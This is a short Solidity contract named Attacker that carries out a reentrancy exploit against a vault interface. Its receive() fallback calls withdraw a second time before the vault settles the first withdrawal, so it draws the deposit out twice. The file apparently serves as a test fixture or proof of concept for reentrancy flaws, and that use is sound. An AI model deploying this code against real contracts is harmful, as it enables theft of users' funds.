// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault { function deposit(uint256) external payable; function withdraw(uint256) external; }

contract Attacker {
    IVault public vault;
    uint256 public amount;
    bool private reentered;

    constructor(address v) payable { vault = IVault(v); }
    receive() external payable {
        if (!reentered) { reentered = true; vault.withdraw(amount); }
    }
    function attack(uint256 a) external payable {
        amount = a;
        vault.deposit{value: a}(a);
        vault.withdraw(a);
    }
}
